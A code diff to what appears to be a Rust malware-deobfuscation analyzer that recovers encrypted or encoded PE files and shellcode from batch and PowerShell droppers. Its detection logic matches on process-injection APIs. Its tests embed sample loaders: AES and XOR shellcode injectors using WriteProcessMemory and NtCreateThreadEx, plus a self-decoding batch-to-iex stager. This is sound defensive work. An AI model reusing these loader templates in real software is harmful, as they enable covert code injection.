+                    "rem omitted multiline base64-encoded hex PE carrier ({} lines, {} base64 bytes, ~{} hex bytes)\r\n",
                     block.len(),
                     total_len,
                     decoded_estimate
@@ -8775,34 +11543,21 @@ fn collect_embedded_base64_pe_carrier_artifacts(text: &str, env: &mut Environmen
 
 fn has_embedded_base64_pe_carrier_hint(input: &[u8]) -> bool {
     for line in input.split(|b| matches!(*b, b'\r' | b'\n')) {
-        let trimmed = trim_ascii_whitespace_bytes(line);
-        if trimmed.len() < 64 {
+        let prefix = line
+            .iter()
+            .position(|b| !b.is_ascii_whitespace())
+            .map_or(&[][..], |idx| &line[idx..]);
+        if prefix.len() < 64 {
             continue;
         }
-        if !trimmed.iter().take(64).all(|b| is_base64_carrier_byte(*b)) {
+        if !prefix.iter().take(64).all(|b| is_base64_carrier_byte(*b)) {
             continue;
         }
-        if trimmed.starts_with(b"TV")
-            || trimmed.starts_with(b"NGQ1")
-            || trimmed.starts_with(b"NEQ1")
-        {
+        if prefix.starts_with(b"TV") || prefix.starts_with(b"NGQ1") || prefix.starts_with(b"NEQ1") {
             return true;
         }
     }
     false
-}
-
-fn trim_ascii_whitespace_bytes(bytes: &[u8]) -> &[u8] {
-    let start = bytes
-        .iter()
-        .position(|b| !b.is_ascii_whitespace())
-        .unwrap_or(bytes.len());
-    let end = bytes
-        .iter()
-        .rposition(|b| !b.is_ascii_whitespace())
-        .map(|idx| idx + 1)
-        .unwrap_or(start);
-    &bytes[start..end]
 }
 
 fn collect_ps1_self_tail_reversed_gzip_pe(
@@ -8810,14 +11565,9 @@ fn collect_ps1_self_tail_reversed_gzip_pe(
     normalized_ps1: &[String],
     env: &mut Environment,
 ) {
-    let has_reversed_gzip_loader = normalized_ps1.iter().any(|ps| {
-        crate::util::contains_ascii_case_insensitive(ps, "getcurrentprocess")
-            && crate::util::contains_ascii_case_insensitive(ps, "readlines")
-            && crate::util::contains_ascii_case_insensitive(ps, "frombase64string")
-            && crate::util::contains_ascii_case_insensitive(ps, "gzipstream")
-            && crate::util::contains_ascii_case_insensitive(ps, "[array]::reverse")
-            && crate::util::contains_ascii_case_insensitive(ps, "assembly]::load")
-    });
+    let has_reversed_gzip_loader = normalized_ps1
+        .iter()
+        .any(|ps| looks_like_self_tail_reversed_gzip_loader_text(ps));
     if !has_reversed_gzip_loader {
         return;
     }
@@ -8995,6 +11745,52 @@ fn decode_base64_pe_carrier_block(block: &[&str]) -> Option<(&'static str, Vec<u
     None
 }
 
+fn decode_nested_base64_pe_carrier_block(block: &[&str]) -> Option<(&'static str, Vec<u8>)> {
+    use base64::Engine;
+
+    if let Some(decoded) = decode_base64_pe_carrier_block(block) {
+        return Some(decoded);
+    }
+
+    let total_len: usize = block.iter().map(|line| line.len()).sum();
+    if total_len > 16 * 1024 * 1024 {
+        return None;
+    }
+    let mut joined = String::with_capacity(total_len);
+    for line in block {
+        joined.push_str(line);
+    }
+
+    let mut current = joined.into_bytes();
+    for _ in 0..8 {
+        let text = std::str::from_utf8(&current).ok()?.trim();
+        if text.len() < 16
+            || text.len() > 16 * 1024 * 1024
+            || !text.bytes().all(is_base64_carrier_byte)
+        {
+            return None;
+        }
+        let decoded = base64::engine::general_purpose::STANDARD
+            .decode(text.as_bytes())
+            .ok()?;
+        if decoded.starts_with(b"MZ") {
+            return Some(("embedded-nested-base64-pe", decoded));
+        }
+        if decoded
+            .get(..4)
+            .is_some_and(|head| head.eq_ignore_ascii_case(b"4d5a"))
+        {
+            let hex_text = std::str::from_utf8(&decoded).ok()?;
+            let pe = hex::decode(hex_text.trim()).ok()?;
+            if pe.starts_with(b"MZ") {
+                return Some(("embedded-nested-base64-hex-pe", pe));
+            }
+        }
+        current = decoded;
+    }
+    None
+}
+
 fn collect_decoded_pe_artifacts(env: &mut Environment) {
     const MAX_DECODED_PE_ARTIFACTS: usize = 16;
 
@@ -9044,30 +11840,321 @@ fn collect_decoded_pe_artifacts(env: &mut Environment) {
     }
 }
 
+fn collect_ps1_aes_shellcode_artifacts(ps1_payloads: &[String], env: &mut Environment) {
+    const MAX_PS1_AES_SHELLCODE_ARTIFACTS: usize = 4;
+
+    let mut added = 0usize;
+    for ps in ps1_payloads {
+        if added >= MAX_PS1_AES_SHELLCODE_ARTIFACTS || env.check_timeout() {
+            return;
+        }
+
+        if let Some(shellcode) = recover_ps1_sha256_aes_shellcode(ps) {
+            if push_recovered_pe_artifact(env, "ps1-aes-shellcode", shellcode) {
+                added += 1;
+            }
+        }
+
+        if added >= MAX_PS1_AES_SHELLCODE_ARTIFACTS || env.check_timeout() {
+            return;
+        }
+        for shellcode in recover_ps1_xor_shellcode_candidates(ps) {
+            if added >= MAX_PS1_AES_SHELLCODE_ARTIFACTS || env.check_timeout() {
+                return;
+            }
+            if push_recovered_pe_artifact(env, "ps1-xor-shellcode", shellcode) {
+                added += 1;
+            }
+        }
+    }
+}
+
+fn recover_ps1_xor_shellcode_candidates(ps: &str) -> Vec<Vec<u8>> {
+    use base64::Engine;
+    use std::collections::HashMap;
+
+    const MAX_B64_INPUT_LEN: usize = 16 * 1024 * 1024;
+    const MAX_XOR_ARTIFACTS: usize = 4;
+
+    if !crate::util::contains_ascii_case_insensitive(ps, "frombase64string")
+        || !crate::util::contains_ascii_case_insensitive(ps, "ntwritevirtualmemory")
+        || !crate::util::contains_ascii_case_insensitive(ps, "ntcreatethreadex")
+        || !crate::util::contains_ascii_case_insensitive(ps, "^")
+    {
+        return Vec::new();
+    }
+
+    let Ok(xor_loop_re) = regex::Regex::new(
+        r#"(?is)\^\s*[A-Za-z_][A-Za-z0-9_]*\s*\[\s*[A-Za-z_][A-Za-z0-9_]*\s*%\s*[A-Za-z_][A-Za-z0-9_]*\.Length\s*\]"#,
+    ) else {
+        return Vec::new();
+    };
+    if !xor_loop_re.is_match(ps) {
+        return Vec::new();
+    }
+
+    let Ok(ps_string_re) = regex::Regex::new(
+        r#"(?im)^\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*["']([A-Za-z0-9+/=]{80,})["']"#,
+    ) else {
+        return Vec::new();
+    };
+    let Ok(csharp_string_re) = regex::Regex::new(
+        r#"(?im)\bstring\s+([A-Za-z_][A-Za-z0-9_]*)\s*=\s*["']([^"'\r\n]{1,8192})["']\s*;"#,
+    ) else {
+        return Vec::new();
+    };
+    let Ok(call_re) = regex::Regex::new(
+        r#"(?is)\b[A-Za-z_][A-Za-z0-9_]*\s*\(\s*Convert\s*\.\s*FromBase64String\s*\(\s*([^)]+?)\s*\)\s*,\s*Convert\s*\.\s*FromBase64String\s*\(\s*([^)]+?)\s*\)\s*\)"#,
+    ) else {
+        return Vec::new();
+    };
+
+    let mut ps_vars: HashMap<String, &str> = HashMap::new();
+    for caps in ps_string_re.captures_iter(ps) {
+        let Some(name) = caps.get(1).map(|m| m.as_str().to_ascii_lowercase()) else {
+            continue;
+        };
+        let Some(value) = caps.get(2).map(|m| m.as_str()) else {
+            continue;
+        };
+        if value.len() <= MAX_B64_INPUT_LEN {
+            ps_vars.insert(name, value);
+        }
+    }
+    let largest_ps_b64 = ps_vars.values().copied().max_by_key(|value| value.len());
+
+    let mut csharp_strings: HashMap<String, &str> = HashMap::new();
+    for caps in csharp_string_re.captures_iter(ps) {
+        let Some(name) = caps.get(1).map(|m| m.as_str().to_ascii_lowercase()) else {
+            continue;
+        };
+        let Some(value) = caps.get(2).map(|m| m.as_str()) else {
+            continue;
+        };
+        csharp_strings.insert(name, value);
+    }
+
+    let mut recovered = Vec::new();
+    for caps in call_re.captures_iter(ps) {
+        if recovered.len() >= MAX_XOR_ARTIFACTS {
+            break;
+        }
+        let Some(data_expr) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(key_expr) = caps.get(2).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(data_b64) =
+            resolve_ps1_xor_b64_expr(data_expr, &csharp_strings, &ps_vars, largest_ps_b64, true)
+        else {
+            continue;
+        };
+        let Some(key_b64) =
+            resolve_ps1_xor_b64_expr(key_expr, &csharp_strings, &ps_vars, largest_ps_b64, false)
+        else {
+            continue;
+        };
+        if data_b64.len() > MAX_B64_INPUT_LEN || key_b64.len() > 4096 {
+            continue;
+        }
+        let Ok(data) = base64::engine::general_purpose::STANDARD.decode(data_b64.as_bytes()) else {
+            continue;
+        };
+        let Ok(key) = base64::engine::general_purpose::STANDARD.decode(key_b64.as_bytes()) else {
+            continue;
+        };
+        if data.len() < 64 || key.is_empty() || key.len() > 512 {
+            continue;
+        }
+        let decoded: Vec<u8> = data
+            .iter()
+            .enumerate()
+            .map(|(idx, byte)| byte ^ key[idx % key.len()])
+            .collect();
+        if !looks_like_recovered_shellcode(&decoded) {
+            continue;
+        }
+        if !recovered.iter().any(|existing| existing == &decoded) {
+            recovered.push(decoded);
+        }
+    }
+
+    recovered
+}
+
+fn resolve_ps1_xor_b64_expr<'a>(
+    expr: &'a str,
+    csharp_strings: &std::collections::HashMap<String, &'a str>,
+    ps_vars: &std::collections::HashMap<String, &'a str>,
+    largest_ps_b64: Option<&'a str>,
+    allow_large_ps_fallback: bool,
+) -> Option<&'a str> {
+    let trimmed = expr.trim();
+    let unquoted = trimmed
+        .strip_prefix('"')
+        .and_then(|s| s.strip_suffix('"'))
+        .or_else(|| {
+            trimmed
+                .strip_prefix('\'')
+                .and_then(|s| s.strip_suffix('\''))
+        })
+        .unwrap_or(trimmed);
+
+    let direct = if unquoted.starts_with('$') {
+        let name = unquoted
+            .trim_start_matches('$')
+            .trim_matches(|ch: char| !(ch == '_' || ch.is_ascii_alphanumeric()))
+            .to_ascii_lowercase();
+        ps_vars.get(&name).copied()
+    } else {
+        csharp_strings
+            .get(&unquoted.to_ascii_lowercase())
+            .copied()
+            .or_else(|| is_probable_base64_literal(unquoted, 16).then_some(unquoted))
+    };
+
+    let value = direct?;
+    if is_probable_base64_literal(value, 16) {
+        return Some(value);
+    }
+    if allow_large_ps_fallback && value.starts_with('$') {
+        let ps_name = value.trim_start_matches('$').to_ascii_lowercase();
+        if let Some(value) = ps_vars.get(&ps_name).copied() {
+            return Some(value);
+        }
+        if ps_vars.len() == 1 {
+            return largest_ps_b64;
+        }
+    }
+    None
+}
+
+fn is_probable_base64_literal(value: &str, min_len: usize) -> bool {
+    value.len() >= min_len
+        && value.len() % 4 == 0
+        && value
+            .bytes()
+            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'='))
+}
+
+fn looks_like_recovered_shellcode(bytes: &[u8]) -> bool {
+    if bytes.len() < 64 {
+        return false;
+    }
+    if bytes.starts_with(b"MZ") || bytes.starts_with(&[0xfc, 0x48, 0x83, 0xe4, 0xf0]) {
+        return true;
+    }
+    let printable = bytes
+        .iter()
+        .filter(|byte| byte.is_ascii_graphic() || byte.is_ascii_whitespace())
+        .count();
+    printable * 100 / bytes.len() < 95
+}
+
+fn recover_ps1_sha256_aes_shellcode(ps: &str) -> Option<Vec<u8>> {
+    use base64::Engine;
+    use sha2::Digest;
+
+    if !crate::util::contains_ascii_case_insensitive(ps, "writeprocessmemory")
+        || !crate::util::contains_ascii_case_insensitive(ps, "transformfinalblock")
+        || !crate::util::contains_ascii_case_insensitive(ps, "sha256")
+        || !crate::util::contains_ascii_case_insensitive(ps, "frombase64string")
+    {
+        return None;
+    }
+
+    let b64_re =
+        regex::Regex::new(r#"(?is)FromBase64String\s*\(\s*["']([A-Za-z0-9+/=]{80,})["']\s*\)"#)
+            .ok()?;
+    let pass_re = regex::Regex::new(r#"(?is)GetBytes\s*\(\s*["']([^"']{1,128})["']\s*\)"#).ok()?;
+    let combined_b64 = b64_re
+        .captures_iter(ps)
+        .filter_map(|caps| caps.get(1).map(|m| m.as_str()))
+        .max_by_key(|blob| blob.len())?;
+    let passphrase = pass_re
+        .captures(ps)
+        .and_then(|caps| caps.get(1).map(|m| m.as_str()))?;
+    let combined = base64::engine::general_purpose::STANDARD
+        .decode(combined_b64.as_bytes())
+        .ok()?;
+    if combined.len() < 64 {
+        return None;
+    }
+    let salt = &combined[..32];
+    let iv = &combined[32..48];
+    let ciphertext = &combined[48..];
+    if ciphertext.is_empty() || ciphertext.len() % 16 != 0 {
+        return None;
+    }
+
+    let mut hasher = sha2::Sha256::new();
+    hasher.update(salt);
+    hasher.update(passphrase.as_bytes());
+    let key = hasher.finalize();
+    let decrypted = crate::aes_chain::crypto::aes_cbc_decrypt(&key, iv, ciphertext).ok()?;
+    (decrypted.len() >= 64).then_some(decrypted)
+}
+
 fn scan_recovered_artifact_strings(env: &mut Environment) {
+    if env.check_timeout() {
+        return;
+    }
     let artifacts: Vec<Vec<u8>> = env
         .recovered_pe
         .iter()
         .map(|(_, blob)| blob.clone())
         .collect();
     for blob in artifacts {
+        if env.check_timeout() {
+            return;
+        }
         scan_binary_input_urls(&blob, env);
+        if env.check_timeout() {
+            return;
+        }
         let behavior_text = recovered_artifact_behavior_text(&blob);
         if !behavior_text.is_empty() {
             deob_scan::scan_deob_text(&behavior_text, env);
         }
-        if let Ok(nested_pes) = aes_chain::dotnet::recover_stride_rc4_pes(&blob) {
+        if env.check_timeout() {
+            return;
+        }
+        let nested_deadline = recovered_artifact_optional_deadline(env.limits.deadline);
+        if let Ok(nested_pes) =
+            aes_chain::dotnet::recover_stride_rc4_pes_until(&blob, nested_deadline)
+        {
             for pe in nested_pes {
+                if env.check_timeout() {
+                    return;
+                }
                 if push_recovered_pe_artifact(env, "dotnet-static-rc4-pe", pe.clone()) {
                     scan_binary_input_urls(&pe, env);
+                    if env.check_timeout() {
+                        return;
+                    }
                     let behavior_text = recovered_artifact_behavior_text(&pe);
                     if !behavior_text.is_empty() {
                         deob_scan::scan_deob_text(&behavior_text, env);
+                    }
+                    if env.check_timeout() {
+                        return;
                     }
                 }
             }
         }
     }
+}
+
+fn recovered_artifact_optional_deadline(
+    parent_deadline: Option<std::time::Instant>,
+) -> Option<std::time::Instant> {
+    let now = std::time::Instant::now();
+    let optional_deadline = now + std::time::Duration::from_millis(250);
+    Some(match parent_deadline {
+        Some(parent_deadline) => parent_deadline.min(optional_deadline),
+        None => optional_deadline,
+    })
 }
 
 fn recovered_artifact_behavior_text(blob: &[u8]) -> String {
@@ -9179,6 +12266,36 @@ fn recovered_artifact_string_is_behavior_hint(s: &str) -> bool {
 
 #[cfg(test)]
 mod recovered_artifact_tests {
+    use crate::{analyze, Config, Environment, Trait};
+
+    fn encrypt_test_shellcode(passphrase: &str, shellcode: &[u8]) -> Result<String, String> {
+        use aes::cipher::{block_padding::Pkcs7, BlockEncryptMut, KeyIvInit};
+        use base64::Engine;
+        use sha2::Digest;
+
+        type Aes256CbcEnc = cbc::Encryptor<aes::Aes256>;
+
+        let salt = [0x42u8; 32];
+        let iv = [0x24u8; 16];
+        let mut hasher = sha2::Sha256::new();
+        hasher.update(salt);
+        hasher.update(passphrase.as_bytes());
+        let key = hasher.finalize();
+        let mut enc_buf = vec![0u8; shellcode.len() + 16];
+        enc_buf[..shellcode.len()].copy_from_slice(shellcode);
+        let cipher = Aes256CbcEnc::new_from_slices(&key, &iv)
+            .map_err(|err| format!("test key/iv rejected: {err:?}"))?;
+        let encrypted = cipher
+            .encrypt_padded_mut::<Pkcs7>(&mut enc_buf, shellcode.len())
+            .map_err(|err| format!("test encrypt failed: {err:?}"))?
+            .to_vec();
+        let mut combined = Vec::new();
+        combined.extend_from_slice(&salt);
+        combined.extend_from_slice(&iv);
+        combined.extend_from_slice(&encrypted);
+        Ok(base64::engine::general_purpose::STANDARD.encode(combined))
+    }
+
     #[test]
     fn recovered_artifact_behavior_hint_matches_mixed_case_markers() {
         assert!(super::recovered_artifact_string_is_behavior_hint(
@@ -9190,6 +12307,202 @@ mod recovered_artifact_tests {
         assert!(!super::recovered_artifact_string_is_behavior_hint(
             "echo hello"
         ));
+    }
+
+    #[test]
+    fn recovered_artifact_scan_marks_expired_deadline() {
+        let mut env = Environment::new(&Config::default());
+        env.limits.deadline = Some(std::time::Instant::now() - std::time::Duration::from_secs(1));
+        env.recovered_pe
+            .push(("already-recovered".to_string(), b"MZstub".to_vec()));
+
+        super::scan_recovered_artifact_strings(&mut env);
+
+        assert!(
+            env.traits
+                .iter()
+                .any(|trait_| matches!(trait_, Trait::TimeoutHit)),
+            "expired recovered-artifact deadline was not surfaced: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn ps1_sha256_aes_shellcode_is_recovered_as_bin_artifact() -> Result<(), String> {
+        let passphrase = "phazzy Lee";
+        let shellcode = [
+            0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0x90, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50,
+            0x52, 0x51,
+        ]
+        .repeat(8);
+        let combined_b64 = encrypt_test_shellcode(passphrase, &shellcode)?;
+        let ps = format!(
+            r#"
+$combinedData = [Convert]::FromBase64String("{combined_b64}")
+$buildSalt = $combinedData[0..31]
+$iv = $combinedData[32..47]
+$ciphertext = $combinedData[48..($combinedData.Length - 1)]
+$key = [System.Security.Cryptography.SHA256]::Create().ComputeHash($buildSalt + [System.Text.Encoding]::UTF8.GetBytes("{passphrase}"))
+$aes = [System.Security.Cryptography.Aes]::Create()
+$aes.Key = $key
+$aes.IV = $iv
+$plain = $aes.CreateDecryptor().TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
+[Kernel32]::WriteProcessMemory($proc, $addr, $plain, $plain.Length, [IntPtr]::Zero)
+"#
+        );
+        let mut env = Environment::new(&Config::default());
+
+        super::collect_ps1_aes_shellcode_artifacts(&[ps], &mut env);
+
+        assert!(
+            env.recovered_pe
+                .iter()
+                .any(|(label, bytes)| label.starts_with("ps1-aes-shellcode") && bytes == &shellcode),
+            "decrypted shellcode was not surfaced as a recovered artifact: {:?}",
+            env.recovered_pe
+                .iter()
+                .map(|(label, bytes)| (label.as_str(), bytes.len()))
+                .collect::<Vec<_>>()
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn sampled_extracted_ps1_sha256_aes_shellcode_is_still_recovered() -> Result<(), String> {
+        use base64::Engine;
+
+        let passphrase = "phazzy Lee";
+        let shellcode = [
+            0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0x90, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50,
+            0x52, 0x51,
+        ]
+        .repeat(8);
+        let combined_b64 = encrypt_test_shellcode(passphrase, &shellcode)?;
+        let ps = format!(
+            r#"
+$combinedData = [Convert]::FromBase64String("{combined_b64}")
+$buildSalt = $combinedData[0..31]
+$iv = $combinedData[32..47]
+$ciphertext = $combinedData[48..($combinedData.Length - 1)]
+$key = [System.Security.Cryptography.SHA256]::Create().ComputeHash($buildSalt + [System.Text.Encoding]::UTF8.GetBytes("{passphrase}"))
+$aes = [System.Security.Cryptography.Aes]::Create()
+$aes.Key = $key
+$aes.IV = $iv
+#{padding}
+$plain = $aes.CreateDecryptor().TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
+[Kernel32]::WriteProcessMemory($proc, $addr, $plain, $plain.Length, [IntPtr]::Zero)
+"#,
+            padding = "A".repeat(100 * 1024),
+        );
+        assert!(
+            ps.len() > 96 * 1024 && ps.len() < 128 * 1024,
+            "test payload should exercise near-threshold large PS1 path: {}",
+            ps.len()
+        );
+        let marker = "remB9SAMPLEDPS1";
+        let outer_b64 = base64::engine::general_purpose::STANDARD.encode(ps.as_bytes());
+        let script = format!(
+            r#"@echo off
+powershell -NoP -C "try {{ $s = Get-Content '%~f0' -Raw; if ($s -match '{marker}([A-Za-z0-9+/=]+)') {{ [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($matches[1])) | iex }} }} catch {{}}"
+{marker}{outer_b64}
+"#
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("omitted middle of large extracted PowerShell payload")),
+            "near-threshold PS1 payload was not sampled in normalized artifacts: {:?}",
+            report.extracted_ps1_normalized
+        );
+        assert!(
+            report
+                .recovered_pe
+                .iter()
+                .any(|(label, bytes)| label.starts_with("ps1-aes-shellcode") && bytes == &shellcode),
+            "sampled near-threshold PS1 shellcode was not surfaced as a recovered artifact: {:?}",
+            report
+                .recovered_pe
+                .iter()
+                .map(|(label, bytes)| (label.as_str(), bytes.len()))
+                .collect::<Vec<_>>()
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn ps1_csharp_repeating_key_xor_shellcode_is_recovered() {
+        use base64::Engine;
+
+        let shellcode = [
+            0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0x90, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50,
+            0x52, 0x51,
+        ]
+        .repeat(8);
+        let key = b"YgMFbSLFeoxQPOkJsDS";
+        let encrypted: Vec<u8> = shellcode
+            .iter()
+            .enumerate()
+            .map(|(idx, byte)| byte ^ key[idx % key.len()])
+            .collect();
+        let encrypted_b64 = base64::engine::general_purpose::STANDARD.encode(encrypted);
+        let key_b64 = base64::engine::general_purpose::STANDARD.encode(key);
+        let ps = format!(
+            r#"
+$carrier = "{encrypted_b64}"
+$source = @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+public class Loader {{
+    [DllImport("ntdll.dll")]
+    static extern IntPtr NtWriteVirtualMemory(IntPtr proc, IntPtr addr, byte[] buf, uint len, ref uint written);
+    [DllImport("ntdll.dll")]
+    static extern IntPtr NtCreateThreadEx(ref IntPtr thread, uint access, IntPtr attrs, IntPtr proc, IntPtr start, IntPtr param, uint flags, uint zero1, uint zero2, uint zero3, IntPtr bytes);
+    static byte[] Decode(byte[] input, byte[] key) {{
+        byte[] output = new byte[input.Length];
+        for (int i = 0; i < input.Length; i++) {{
+            output[i] = (byte)(input[i] ^ key[i % key.Length]);
+        }}
+        return output;
+    }}
+    public static void Run() {{
+        string keyB64 = "{key_b64}";
+        string dataB64 = "$carrier";
+        byte[] payload = Decode(Convert.FromBase64String(dataB64), Convert.FromBase64String(keyB64));
+        uint written = 0;
+        IntPtr thread = IntPtr.Zero;
+        NtWriteVirtualMemory(Process.GetCurrentProcess().Handle, IntPtr.Zero, payload, (uint)payload.Length, ref written);
+        NtCreateThreadEx(ref thread, 0x1FFFFF, IntPtr.Zero, Process.GetCurrentProcess().Handle, IntPtr.Zero, IntPtr.Zero, 0, 0, 0, 0, IntPtr.Zero);
+    }}
+}}
+"@
+"#
+        );
+        let mut env = Environment::new(&Config::default());
+
+        let recovered = super::recover_ps1_xor_shellcode_candidates(&ps);
+        assert!(
+            recovered.iter().any(|bytes| bytes == &shellcode),
+            "XOR helper did not recover shellcode: {:?}",
+            recovered.iter().map(Vec::len).collect::<Vec<_>>()
+        );
+
+        super::collect_ps1_aes_shellcode_artifacts(&[ps], &mut env);
+
+        assert!(
+            env.recovered_pe
+                .iter()
+                .any(|(label, bytes)| label.starts_with("ps1-xor-shellcode") && bytes == &shellcode),
+            "decoded XOR shellcode was not surfaced as a recovered artifact: {:?}",
+            env.recovered_pe
+                .iter()
+                .map(|(label, bytes)| (label.as_str(), bytes.len()))
+                .collect::<Vec<_>>()
+        );
     }
 }
 
@@ -9272,7 +12585,11 @@ fn trait_kind(t: &Trait) -> String {
 fn semantic_dedup_key(t: &Trait) -> Option<String> {
     match t {
         Trait::Download { src, dst, .. } => {
-            Some(format!("Download\0{src}\0{}", dst.as_deref().unwrap_or("")))
+            let dst = dst
+                .as_deref()
+                .map(canonical_download_dst_for_dedup)
+                .unwrap_or_default();
+            Some(format!("Download\0{src}\0{dst}"))
         }
         Trait::UrlLaunch { url, .. } => Some(format!("UrlLaunch\0{url}")),
         Trait::UrlArgument { cmd, url } => Some(format!("UrlArgument\0{cmd}\0{url}")),
@@ -9282,13 +12599,328 @@ fn semantic_dedup_key(t: &Trait) -> Option<String> {
         Trait::CertutilDownload { url, dst } => Some(format!("CertutilDownload\0{url}\0{dst}")),
         Trait::BitsadminDownload { url, dst } => Some(format!("BitsadminDownload\0{url}\0{dst}")),
         Trait::DownloadInDeobText { src, .. } => Some(format!("DownloadInDeobText\0{src}")),
+        Trait::DefenderEvasion { action, target } => {
+            Some(format!("DefenderEvasion\0{action}\0{}", canonical_defender_target_for_dedup(target)))
+        }
+        Trait::SelfElevation { target, args } => {
+            Some(format!(
+                "SelfElevation\0{target}\0{}",
+                args.as_deref().unwrap_or_default()
+            ))
+        }
+        Trait::AntiAnalysis {
+            technique, target, ..
+        } => Some(format!("AntiAnalysis\0{technique}\0{target}")),
         Trait::UncWebDavC2 {
             share_path,
             http_url,
             ..
         } => Some(format!("UncWebDavC2\0{share_path}\0{http_url}")),
+        Trait::MultiStageEncryptedDropper {
+            marker,
+            b64_length,
+            has_aes_cbc,
+            has_gzip_stage,
+            reads_self_lines,
+            aes_key_b64,
+            aes_iv_b64,
+            ..
+        } => Some(format!(
+            "MultiStageEncryptedDropper\0{marker}\0{b64_length}\0{has_aes_cbc}\0{has_gzip_stage}\0{reads_self_lines}\0{}\0{}",
+            aes_key_b64.as_deref().unwrap_or(""),
+            aes_iv_b64.as_deref().unwrap_or("")
+        )),
         _ => None,
     }
+}
+
+fn canonical_defender_target_for_dedup(target: &str) -> String {
+    canonical_download_dst_for_dedup(target.trim())
+}
+
+fn canonical_download_dst_for_dedup(dst: &str) -> String {
+    let mut value = dst.trim_matches(['"', '\'']).to_string();
+    for (name, replacement) in [
+        ("%APPDATA%", "C:\\Users\\puncher\\AppData\\Roaming"),
+        ("%LOCALAPPDATA%", "C:\\Users\\puncher\\AppData\\Local"),
+        ("%TEMP%", "C:\\Users\\puncher\\AppData\\Local\\Temp"),
+        ("%TMP%", "C:\\Users\\puncher\\AppData\\Local\\Temp"),
+        ("%USERPROFILE%", "C:\\Users\\puncher"),
+        ("%PUBLIC%", "C:\\Users\\Public"),
+        ("$env:APPDATA", "C:\\Users\\puncher\\AppData\\Roaming"),
+        ("$env:LOCALAPPDATA", "C:\\Users\\puncher\\AppData\\Local"),
+        ("$env:TEMP", "C:\\Users\\puncher\\AppData\\Local\\Temp"),
+        ("$env:TMP", "C:\\Users\\puncher\\AppData\\Local\\Temp"),
+        ("$env:USERPROFILE", "C:\\Users\\puncher"),
+        ("$env:PUBLIC", "C:\\Users\\Public"),
+    ] {
+        value = replace_ascii_case_insensitive(&value, name, replacement);
+    }
+
+    let mut out = String::with_capacity(value.len());
+    let mut last_was_sep = false;
+    for ch in value.chars() {
+        let ch = if ch == '/' { '\\' } else { ch };
+        if ch == '\\' {
+            if !last_was_sep {
+                out.push(ch);
+            }
+            last_was_sep = true;
+        } else {
+            out.push(ch.to_ascii_lowercase());
+            last_was_sep = false;
+        }
+    }
+    out
+}
+
+fn replace_ascii_case_insensitive(text: &str, needle: &str, replacement: &str) -> String {
+    let mut out = String::with_capacity(text.len());
+    let mut search_from = 0usize;
+    while let Some(pos) = crate::util::find_ascii_case_insensitive_from(text, needle, search_from) {
+        out.push_str(&text[search_from..pos]);
+        out.push_str(replacement);
+        search_from = pos + needle.len();
+    }
+    out.push_str(&text[search_from..]);
+    out
+}
+
+fn collapse_numeric_label_dispatch_traits(traits: &mut Vec<Trait>) {
+    const MIN_DISPATCH_ARITHMETIC_EVENTS: u64 = 16;
+    const MIN_DISPATCH_GOTO_EVENTS: u64 = 25;
+    const REPRESENTATIVE_KEEP: u64 = 8;
+
+    let arithmetic_count = traits
+        .iter()
+        .filter(|t| match t {
+            Trait::Arithmetic { expr, .. } | Trait::ArithmeticParseError { expr } => {
+                looks_like_dispatch_arithmetic_expr(expr)
+            }
+            _ => false,
+        })
+        .count() as u64;
+    let goto_count = traits
+        .iter()
+        .filter(
+            |t| matches!(t, Trait::GotoUnresolved { to_label, .. } if is_numeric_label(to_label)),
+        )
+        .count() as u64;
+
+    if arithmetic_count < MIN_DISPATCH_ARITHMETIC_EVENTS || goto_count < MIN_DISPATCH_GOTO_EVENTS {
+        return;
+    }
+
+    let mut kept_arithmetic = 0u64;
+    let mut kept_goto = 0u64;
+    traits.retain(|t| match t {
+        Trait::Arithmetic { expr, .. } | Trait::ArithmeticParseError { expr }
+            if looks_like_dispatch_arithmetic_expr(expr) =>
+        {
+            kept_arithmetic += 1;
+            kept_arithmetic <= REPRESENTATIVE_KEEP
+        }
+        Trait::GotoUnresolved { to_label, .. } if is_numeric_label(to_label) => {
+            kept_goto += 1;
+            kept_goto <= REPRESENTATIVE_KEEP
+        }
+        _ => true,
+    });
+    traits.push(Trait::ControlFlowObfuscation {
+        pattern: "numeric-label-arithmetic-dispatch".to_string(),
+        arithmetic_count,
+        goto_count,
+    });
+}
+
+fn is_numeric_label(label: &str) -> bool {
+    !label.is_empty() && label.bytes().all(|b| b.is_ascii_digit())
+}
+
+fn collapse_arithmetic_scaffolding_traits(traits: &mut Vec<Trait>) {
+    const MIN_SCAFFOLD_EVENTS: u64 = 25;
+    const REPRESENTATIVE_KEEP: u64 = 8;
+
+    let arithmetic_count = traits
+        .iter()
+        .filter(|t| match t {
+            Trait::Arithmetic { expr, .. } | Trait::ArithmeticParseError { expr } => {
+                looks_like_scaffold_arithmetic_expr(expr)
+            }
+            _ => false,
+        })
+        .count() as u64;
+
+    if arithmetic_count < MIN_SCAFFOLD_EVENTS {
+        return;
+    }
+
+    let mut kept_arithmetic = 0u64;
+    traits.retain(|t| match t {
+        Trait::Arithmetic { expr, .. } | Trait::ArithmeticParseError { expr }
+            if looks_like_scaffold_arithmetic_expr(expr) =>
+        {
+            kept_arithmetic += 1;
+            kept_arithmetic <= REPRESENTATIVE_KEEP
+        }
+        _ => true,
+    });
+    traits.push(Trait::ControlFlowObfuscation {
+        pattern: "arithmetic-scaffolding".to_string(),
+        arithmetic_count,
+        goto_count: 0,
+    });
+}
+
